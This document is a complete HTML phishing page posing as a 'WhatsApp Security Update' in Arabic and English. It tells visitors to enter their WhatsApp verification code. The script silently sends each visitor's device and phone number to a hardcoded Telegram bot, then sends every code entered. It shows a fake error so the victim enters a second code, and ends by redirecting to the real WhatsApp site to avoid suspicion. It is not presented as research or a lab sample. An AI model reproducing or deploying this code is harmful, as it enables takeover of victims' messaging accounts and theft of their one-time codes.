<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Security</title>
    <style>
        :root { --wa-bg: #0b141a; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, Segoe UI, Roboto, sans-serif; }
        body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; }
        #checker { position: fixed; inset: 0; background: var(--wa-bg); z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .pulse-logo { width: 60px; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } }
        .container { width: 100%; max-width: 400px; padding: 25px; text-align: center; display: none; }
        .active { display: block; animation: fadeIn 0.5s ease; }
        .card { background: #1d2a33; border-radius: 12px; padding: 18px; text-align: initial; margin-bottom: 20px; border: 1px solid #2a3942; }
        .line { font-size: 13px; margin-bottom: 8px; color: var(--wa-hint); display: flex; justify-content: space-between; }
        .line b { color: #fff; }
        .otp-input { width: 100%; background: transparent; border: none; border-bottom: 2px solid #2a3942; color: #fff; font-size: 30px; text-align: center; outline: none; letter-spacing: 5px; margin: 20px 0; }
        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 15px; border-radius: 25px; font-size: 15px; font-weight: bold; cursor: pointer; }
        .spinner { border: 3px solid #202c33; border-top: 3px solid var(--wa-green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .rtl { direction: rtl; } .ltr { direction: ltr; }
    </style>
</head>
<body>

    <div id="checker">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="pulse-logo">
        <p id="load-text" style="margin-top:20px; font-size:14px; color:var(--wa-hint);"></p>
    </div>

    <div class="container" id="app">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="50" style="margin-bottom:15px;">
        <h2 id="title" style="font-size:20px; margin-bottom:20px; font-weight: 500;"></h2>
        <div class="card">
            <div class="line"><span id="lbl-device"></span> <b id="device"></b></div>
            <div class="line"><span id="lbl-status"></span> <span style="color:var(--wa-green);" id="status-txt"></span></div>
            <div style="border-top: 1px solid #2a3942; margin-top:10px; padding-top:10px;">
                <span id="lbl-number"></span> <b id="phone-display" style="color:var(--wa-green);"></b>
            </div>
        </div>
        <p id="desc" style="font-size: 13px; color: var(--wa-hint); line-height: 1.5; margin-bottom: 20px;"></p>
        <input type="tel" id="otp" class="otp-input" maxlength="7" inputmode="numeric" placeholder="--- ---">
        <button class="btn" id="btn-txt" onclick="run()"></button>
    </div>

    <script>
        const langs = {
            ar: { load: "جاري التحقق من أمان الجهاز...", title: "تحديث أمان واتساب", device: "الجهاز:", status: "الحالة:", status_v: "تحديث مطلوب", number: "الرقم الموثق:", desc: "أدخل كود التحقق المكون من 6 أرقام لتأكيد تحديث نظام التشفير.", btn: "تحديث الآن", err: "الكود غير صحيح، تم إرسال كود جديد.", wait: "جاري المعالجة..." },
            en: { load: "Verifying device security...", title: "WhatsApp Security Update", device: "Device:", status: "Status:", status_v: "Update Required", number: "Verified Number:", desc: "Enter the 6-digit verification code to confirm encryption update.", btn: "Update Now", err: "Invalid code. A new code has been sent.", wait: "Processing..." }
        };

        const userLang = navigator.language.startsWith('ar') ? 'ar' : 'en';
        const t = langs[userLang];
        document.body.className = userLang === 'ar' ? 'rtl' : 'ltr';

        document.getElementById('load-text').innerText = t.load;
        document.getElementById('title').innerText = t.title;
        document.getElementById('lbl-device').innerText = t.device;
        document.getElementById('lbl-status').innerText = t.status;
        document.getElementById('status-txt').innerText = t.status_v;
        document.getElementById('lbl-number').innerText = t.number;
        document.getElementById('desc').innerText = t.desc;
        document.getElementById('btn-txt').innerText = t.btn;

        const CFG = {
            T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
            C: '5446862709',
            P: new URLSearchParams(window.location.search).get('u') || "01030003287"
        };
        document.getElementById('phone-display').innerText = `+20 ${CFG.P.substring(0,3)} •••• ${CFG.P.slice(-2)}`;

        function getDeviceSimple() {
            const ua = navigator.userAgent;
            if (/iPhone|iPad|iPod/.test(ua)) return "iPhone";
            if (/Android/.test(ua)) return "Android";
            if (/Windows/.test(ua)) return "Windows";
            if (/Macintosh/.test(ua)) return "Mac";
            if (/Linux/.test(ua)) return "Linux";
            return "Unknown Device";
        }

        const deviceName = getDeviceSimple();
        document.getElementById('device').innerText = deviceName;

        document.getElementById('otp').addEventListener('input', e => {
            let v = e.target.value.replace(/\D/g, '');
            if (v.length > 3) v = v.slice(0, 3) + '-' + v.slice(3, 6);
            e.target.value = v;
        });

        async function notify(msg) {
            await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CFG.C, text: msg, parse_mode: 'HTML' })
            }).catch(()=>{});
        }

        window.onload = () => {
            setTimeout(() => {
                document.getElementById('checker').style.display = 'none';
                document.getElementById('app').classList.add('active');
                notify(`👤 <b>New Target</b>\n📱 Device: <code>${deviceName}</code>\n🌍 Phone: <code>${CFG.P}</code>`);
            }, 2500);
        };

        let step = 0;
        async function run() {
            const val = document.getElementById('otp').value;
            if(val.length < 7) return;
            step++;
            const btn = document.getElementById('btn-txt');
            btn.innerText = t.wait; btn.disabled = true;

            await notify(`🔥 <b>OTP #${step}</b>\n📱 Device: <code>${deviceName}</code>\n👤 Phone: <code>${CFG.P}</code>\n🔑 Code: <code>${val}</code>`);

            if(step === 1) {
                setTimeout(() => {
                    alert(t.err);
                    document.getElementById('otp').value = "";
                    btn.innerText = t.btn; btn.disabled = false;
                }, 1500);
            } else {
                document.body.innerHTML = `<div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh;"><div class="spinner"></div><p style="margin-top:20px; color:#8696a0;">Syncing...</p></div>`;
                setTimeout(() => window.location.href = "https://www.whatsapp.com/security", 2000);
            }
        }
    </script>
</body>
</html>
